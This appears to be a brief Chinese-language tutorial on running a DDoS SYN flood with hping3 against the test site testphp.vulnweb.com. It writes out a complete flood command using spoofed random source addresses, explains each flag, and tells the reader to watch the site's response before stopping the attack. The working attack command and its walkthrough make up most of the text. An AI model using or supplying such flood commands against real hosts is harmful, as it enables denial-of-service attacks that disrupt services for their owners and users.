# DDOS-Hping

---

Hping是一个命令行下使用的TCP/IP数据包组装/分析工具，其命令模式很像Unix下的ping命令，但是它不是只能发送ICMP回应请求，它还可以支持TCP、UDP、ICMP和RAW-IP协议，它有一个路由跟踪模式，能够在两个相互包含的通道之间传送文件。Hping常被用于检测网络和主机，其功能非常强大，可在多种操作系统下运行，如Linux，FreeBSD，NetBSD，OpenBSD，Solaris，MacOs X，Windows。

寻找测试网站网站：http://testphp.vulnweb.com/login.php

hping3 --help

hping3小工具进行DDos攻击

hping3 -c 1200 -d 130 -S -w 64 -p 80 --flood --rand-source testphp.vulnweb.com

-c(count) 表示要发送的数据包的数量

-d(data size) 发送数据包的大小

-S（SYN）SYN数据包

-w 表示TCP的窗口大小

-p 端口

–flood 洪水攻击模式

–rand-source 表示设定随机的源地址

testphp.vulnweb.com 需要攻击的网站域名

3.5 测试进行中。。。。。。。。

3.6 如下图所示，刷新被测试的网站，查看测试效果。

3.7 停止测试，查看效果，如下图所示。

命令：Ctrl+c
